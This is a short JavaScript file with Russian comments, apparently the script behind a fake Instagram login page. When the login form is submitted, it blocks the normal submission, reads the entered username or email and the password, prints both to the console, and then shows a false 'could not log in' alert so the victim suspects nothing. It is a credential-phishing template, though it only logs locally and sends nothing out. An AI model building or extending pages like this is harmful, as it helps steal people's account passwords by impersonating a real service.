// 1. Уведомление при загрузке страницы (имитация "захода")
console.log("======================================");
console.log("✅ Уведомление: Новый посетитель зашел на страницу входа в Instagram!");
console.log("======================================");

// 2. Имитация обработки формы при нажатии кнопки "Вход"
document.getElementById('login-form').addEventListener('submit', function(event) {
    // Отменяем стандартное действие отправки формы
    event.preventDefault(); 
    
    // Получаем значение поля имени/телефона/email
    const username = this.querySelector('input[type="text"]').value;

    // !!! ВАЖНО: Получаем значение поля пароля
    const password = this.querySelector('input[type="password"]').value; 

    // Выводим сообщение в консоль
    console.log("--------------------------------------");
    console.log(`   Имя/Email: ${username || 'НЕ указано'}`);
    console.log(`   Пароль:    ${password || 'НЕ указан'}`);
    console.log("--------------------------------------");

    // Выводим alert для наглядности
    alert(`Не удалось войт в аккаунт.`);
});